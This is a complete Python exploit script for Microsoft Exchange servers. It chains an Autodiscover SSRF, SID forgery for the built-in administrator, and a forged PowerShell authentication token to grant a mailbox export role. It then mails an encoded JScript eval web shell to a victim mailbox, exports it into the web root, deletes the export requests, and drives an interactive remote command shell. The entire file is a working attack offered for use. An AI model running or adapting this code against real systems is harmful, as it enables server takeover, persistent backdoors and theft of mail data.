import requests
from urllib3.exceptions import InsecureRequestWarning
import argparse
import base64
import struct
import re
from pypsrp.powershell import PowerShell, RunspacePool
from pypsrp.wsman import WSMan
import logging
import smtplib
import binascii
import time
import random
import uuid
import string

requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
user_agent = "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36."
logger = logging.getLogger(__name__)


def exploit_stage1(target, email):
    logger.debug("[Stage 1] Performing SSRF attack against Autodiscover")

    autoDiscoverBody = """<Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006">
        <Request>
          <EMailAddress>%s</EMailAddress> 
          <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>
        </Request>
    </Autodiscover>
    """ % email

    # Perform the request to the target
    stage1 = requests.post("https://%s/autodiscover/autodiscover.json?@fucky0u.edu/autodiscover/autodiscover.xml?=&Email=autodiscover/autodiscover.json%%3f@fucky0u.edu" % (target), headers={
        "Content-Type": "text/xml",
        "User-Agent": user_agent},
                           data=autoDiscoverBody,
                           verify=False
                           )
    # If status code 200 is NOT returned, the request failed
    if stage1.status_code != 200:
        logger.error("[Stage 1] Request failed - Autodiscover Error!")
        exit()

    # If the LegacyDN information is not in the response, the request failed as well
    if "<LegacyDN>" not in stage1.content.decode('utf8').strip():
        logger.error("[Stage 1] Cannot obtain required LegacyDN-information!")
        exit()

    # Define LegacyDN for further use in the script
    legacyDn = stage1.content.decode('utf8').strip().split("<LegacyDN>")[1].split("</LegacyDN>")[0]

    #print("[Stage 1] Successfully obtained DN: " + legacyDn)
    return legacyDn

def exploit_stage2(target, legacyDn):
    logger.debug("[Stage 2] Performing malformed SSRF attack to obtain Security ID (SID) using endpoint /mapi/emsmdb against " + target)

    # Malformed MAPI body
    mapi_body = legacyDn + "\x00\x00\x00\x00\x00\xe4\x04\x00\x00\x09\x04\x00\x00\x09\x04\x00\x00\x00\x00\x00\x00"

    # Send the request
    stage2 = requests.post("https://%s/autodiscover/autodiscover.json?@fucky0u.edu/mapi/emsmdb/?=&Email=autodiscover/autodiscover.json%%3f@fucky0u.edu" % (target),
        headers={
        "Content-Type": "application/mapi-http",
        "User-Agent": user_agent,
        "X-RequestId": "1337",
        "X-ClientApplication": "Outlook/15.00.0000.0000",
        # The headers X-RequestId, X-ClientApplication and X-requesttype are required for the request to work
        "x-requesttype": "connect"},
                           data=mapi_body,
                           verify=False
                           )

    if stage2.status_code != 200 or "act as owner of a UserMailbox" not in stage2.content.decode('cp1252').strip():
        logger.error("[Stage 2] Mapi Error!")
        exit()

    sid = stage2.content.decode('cp1252').strip().split("with SID ")[1].split(" and MasterAccountSid")[0]

    if sid.split("-")[-1] != "500":
        logger.warning("[Stage 2] User SID not an administrator, fixing user SID")
        base_sid = sid.split("-")[:-1]
        base_sid.append("500")
        sid = "-".join(base_sid)

    logger.debug("[Stage 2] Successfully obtained SID: " + sid)
    return sid

def exploit_stage3(target, email, sid):
    logger.debug("[Stage 3] Accessing /Powershell Endpoint ...")
    payload_1 = b"V\x01\x00T\x07WindowsC\x00A\x05BasicL" + struct.pack("B", len(email)) + email.encode() + b"U"
    payload_FUZZ = b","
    payload_2 = sid.encode() + b"G\x04\x00\x00\x00\x07\x00\x00\x00\x07S-1-1-0\x07\x00\x00\x00\x07S-1-5-2\x07\x00\x00\x00\x08S-1-5-11\x07\x00\x00\x00\x08S-1-5-15E\x00\x00\x00\x00"
    payload = payload_1 + payload_FUZZ + payload_2

    payload_b64 = base64.urlsafe_b64encode(payload).decode()
    stage4 = requests.get("https://%s/autodiscover/autodiscover.json?@fucky0u.edu/Powershell?X-Rps-CAT=%s&Email=autodiscover/autodiscover.json%%3F@fucky0u.edu" % (target, payload_b64), 
    headers={
        "Content-Type": "application/soap+xml;charset=UTF-8",
        "User-Agent": user_agent,
   },
    verify=False
    )

    if (stage4.status_code != 200):
        payload_FUZZ = b"-"
        payload = payload_1 + payload_FUZZ + payload_2
        payload_b64 = base64.urlsafe_b64encode(payload).decode()
        stage4 = requests.get("https://%s/autodiscover/autodiscover.json?@fucky0u.edu/Powershell?X-Rps-CAT=%s&Email=autodiscover/autodiscover.json%%3F@fucky0u.edu" % (target, payload_b64), 
            headers={
                "Content-Type": "application/soap+xml;charset=UTF-8",
                "User-Agent": user_agent,
           },
            verify=False
            )
        if (stage4.status_code != 200):
            for fuzz in range(0x100):
                payload = payload_1 + fuzz.encode() + payload_2
                payload_b64 = base64.urlsafe_b64encode(payload).decode()
                stage4 = requests.get("https://%s/autodiscover/autodiscover.json?@fucky0u.edu/Powershell?X-Rps-CAT=%s&Email=autodiscover/autodiscover.json%%3F@fucky0u.edu" % (target, payload_b64), 
                    headers={
                        "Content-Type": "application/soap+xml;charset=UTF-8",
                        "User-Agent": user_agent,
                   },
                    verify=False
                    )
                if (stage4.status_code == 200):
                    #print("[Stage 3] Authentication Successfully")
                    return payload_b64
            logger.error("[Stage 3] Authentication Failed")
            exit(1)
        else:
            logger.debug("[Stage 3] Authentication Successfully")
            return payload_b64
    else:
        logger.debug("[Stage 3] Authentication Successfully")
        return payload_b64

def exploit_stage4(target, auth_b64, alias_name, subject, fShell):
    logger.debug("[Stage 4] Dealing with WSMV")
    wsman = WSMan(server=target, port=443,
    path='/autodiscover/autodiscover.json?@fucky0u.edu/Powershell?X-Rps-CAT=' + auth_b64 +'&Email=autodiscover/autodiscover.json%3F@fucky0u.edu', 
    ssl="true", 
    cert_validation=False)
    logger.debug("[Stage 4] Dealing with PSRP")
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        logger.debug("[Stage 4] Assign Management Role")
        ps = PowerShell(pool)
        #ps.add_cmdlet("Get-User")
        ps.add_cmdlet("New-ManagementRoleAssignment")
        ps.add_parameter("Role", "Mailbox Import Export")
        ps.add_parameter("SecurityGroup", "Organization Management")
        output = ps.invoke()
        
    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        
        logger.debug("[Stage 4] Exporting MailBox as Webshell")
        ps = PowerShell(pool)
        ps.add_cmdlet("New-MailboxExportRequest")
        ps.add_parameter("Mailbox", alias_name)
        ps.add_parameter("Name", subject)
        ps.add_parameter("ContentFilter", "Subject -eq '%s'" % (subject))
        ps.add_parameter("FilePath", "\\\\127.0.0.1\\c$\\inetpub\\wwwroot\\aspnet_client\\%s" % fShell)
        output = ps.invoke()
        logger.debug("[Stage 4] Webshell Path: c:\\inetpub\\wwwroot\\aspnet_client\\%s" % fShell)

    with RunspacePool(wsman, configuration_name="Microsoft.Exchange") as pool:
        
        logger.debug("[Stage 4] Cleaning Notification")
        ps = PowerShell(pool)
        ps.add_script("Get-MailboxExportRequest | Remove-MailboxExportRequest -Confirm:$false")
        output = ps.invoke()

def compressible_decode(payload):
    compEnc = [ 0x47, 0xf1, 0xb4, 0xe6, 0x0b, 0x6a, 0x72, 0x48, 0x85, 0x4e, 0x9e, 0xeb, 0xe2, 0xf8, 0x94,
        0x53, 0xe0, 0xbb, 0xa0, 0x02, 0xe8, 0x5a, 0x09, 0xab, 0xdb, 0xe3, 0xba, 0xc6, 0x7c, 0xc3, 0x10, 0xdd, 0x39,
        0x05, 0x96, 0x30, 0xf5, 0x37, 0x60, 0x82, 0x8c, 0xc9, 0x13, 0x4a, 0x6b, 0x1d, 0xf3, 0xfb, 0x8f, 0x26, 0x97,
        0xca, 0x91, 0x17, 0x01, 0xc4, 0x32, 0x2d, 0x6e, 0x31, 0x95, 0xff, 0xd9, 0x23, 0xd1, 0x00, 0x5e, 0x79, 0xdc,
        0x44, 0x3b, 0x1a, 0x28, 0xc5, 0x61, 0x57, 0x20, 0x90, 0x3d, 0x83, 0xb9, 0x43, 0xbe, 0x67, 0xd2, 0x46, 0x42,
        0x76, 0xc0, 0x6d, 0x5b, 0x7e, 0xb2, 0x0f, 0x16, 0x29, 0x3c, 0xa9, 0x03, 0x54, 0x0d, 0xda, 0x5d, 0xdf, 0xf6,
        0xb7, 0xc7, 0x62, 0xcd, 0x8d, 0x06, 0xd3, 0x69, 0x5c, 0x86, 0xd6, 0x14, 0xf7, 0xa5, 0x66, 0x75, 0xac, 0xb1,
        0xe9, 0x45, 0x21, 0x70, 0x0c, 0x87, 0x9f, 0x74, 0xa4, 0x22, 0x4c, 0x6f, 0xbf, 0x1f, 0x56, 0xaa, 0x2e, 0xb3,
        0x78, 0x33, 0x50, 0xb0, 0xa3, 0x92, 0xbc, 0xcf, 0x19, 0x1c, 0xa7, 0x63, 0xcb, 0x1e, 0x4d, 0x3e, 0x4b, 0x1b,
        0x9b, 0x4f, 0xe7, 0xf0, 0xee, 0xad, 0x3a, 0xb5, 0x59, 0x04, 0xea, 0x40, 0x55, 0x25, 0x51, 0xe5, 0x7a, 0x89,
        0x38, 0x68, 0x52, 0x7b, 0xfc, 0x27, 0xae, 0xd7, 0xbd, 0xfa, 0x07, 0xf4, 0xcc, 0x8e, 0x5f, 0xef, 0x35, 0x9c,
        0x84, 0x2b, 0x15, 0xd5, 0x77, 0x34, 0x49, 0xb6, 0x12, 0x0a, 0x7f, 0x71, 0x88, 0xfd, 0x9d, 0x18, 0x41, 0x7d,
        0x93, 0xd8, 0x58, 0x2c, 0xce, 0xfe, 0x24, 0xaf, 0xde, 0xb8, 0x36, 0xc8, 0xa1, 0x80, 0xa6, 0x99, 0x98, 0xa8,
        0x2f, 0x0e, 0x81, 0x65, 0x73, 0xe4, 0xc2, 0xa2, 0x8a, 0xd4, 0xe1, 0x11, 0xd0, 0x08, 0x8b, 0x2a, 0xf2, 0xed,
        0x9a, 0x64, 0x3f, 0xc1, 0x6c, 0xf9, 0xec ];
    out = [None]*len(payload)
    for i in range(len(payload)):
        temp = ord(payload[i]) & 0xff
        out[i] = "%02x" % (compEnc[temp])
    out = ''.join(out)
    return binascii.unhexlify(out)

def get_random_string(length):
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    return result_str

def send_mail_to_victim(smtpsrv, port, user, passwd, victim, subject):
    sender = 'me@fucky0u.edu'

    shell_pass = get_random_string(10)
    payload = '\n<script language="JScript" runat="server">function Page_Load(){var doggy= Request["%s"];eval(doggy)}</script>' % (shell_pass)
    payload_compressible = compressible_decode(payload)

    message = (
        b"From: %b\r\n" % (sender.encode()) +
        b"Content-transfer-encoding: 7bit\r\n"+
        b"Content-type: text/plain; charset=\"utf-8\"\r\n"+
        b"To: <%b>\r\n" % (victim.encode()) +
        b"Subject: %b\r\n" % (subject.encode()) +
        b"Hello: " + payload_compressible + b"\r\n" +
        b"\r\n"+
        b"A"
    )
    try:
        smtpObj = smtplib.SMTP(smtpsrv, port)
        smtpObj.sendmail(sender, victim, message)
        logger.debug("Successfully sent email")
        return shell_pass
    except:
        logger.debug("Error: unable to send email")
        exit(1)

def webshell(target, fShell, shell_pass):
    cmd = ''
    logger.debug("Accessing Webshell Now ...")
    while not cmd == "exit" or cmd == "quit":
        cmd = input("sh3ll> ")
        command = requests.post("https://%s/aspnet_client/%s" % (target, fShell), headers={
            "User-Agent": user_agent
        },
          data= {shell_pass:"""var command=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String("{}"));  var c=new System.Diagnostics.ProcessStartInfo("cmd.exe");var e=new System.Diagnostics.Process();var out:System.IO.StreamReader,EI:System.IO.StreamReader;c.UseShellExecute=false;c.RedirectStandardOutput=true;c.RedirectStandardError=true;e.StartInfo=c;c.Arguments="/c "+command;e.Start();out=e.StandardOutput;EI=e.StandardError;e.Close();Response.Write("ZZzzZzZz" + out.ReadToEnd()+EI.ReadToEnd() + "ZZzzZzZz");""".format(base64.b64encode(cmd.encode()).decode())},
          verify=False
          )
        try:
            output = re.search(b'ZZzzZzZz(.*)ZZzzZzZz', command.content, re.MULTILINE|re.DOTALL).group(1)
            print(output.decode("utf-8"))
        except:
            logger.error('something wrong with webshell..., it might be the Anti-Virus or some encoding problem, you can manually check/connect https://%s/aspnet_client/%s , the password is `%s`' % (target, fShell, shell_pass))

def main(args):
    target = args.target
    email = args.email
    alias_name = email.split('@')[0]
    subject = uuid.uuid4().hex
    fShell = get_random_string(6) + '.aspx'
    
    legacyDn = exploit_stage1(target, email)
    sid = exploit_stage2(target, legacyDn)
    auth_b64 = exploit_stage3(target, email, sid)

    if not args.smtp:
        target_smtp_ip, target_smtp_port = target, 25
    else:
        target_smtp_ip, target_smtp_port = args.smtp.split(':')
    shell_pass = send_mail_to_victim(target_smtp_ip, target_smtp_port, "aaa", "aaa", email, subject)
    logger.debug('litte sleep to wait for mail sending')
    time.sleep(10)
    logger.debug("[Stage 4] Writing Webshell ...")
    exploit_stage4(target, auth_b64, alias_name, subject, fShell)
    logger.debug('litte sleep to wait for mailbox exporting')
    time.sleep(10)
    webshell(target, fShell, shell_pass)
    exit(1)

parser = argparse.ArgumentParser()
parser.add_argument('target', help='the target Exchange Server ip')
parser.add_argument('email', help='victim email')
parser.add_argument("--smtp", type=str, help="target smtp server [smtp_ip:smtp_port], in case your target is not the destination for sending mail.")
args = parser.parse_args()

formatter = logging.Formatter(fmt='%(message)s')
handler = logging.StreamHandler()
handler.setFormatter(formatter)
logger.addHandler(handler)
logger.setLevel(logging.DEBUG)
main(args)
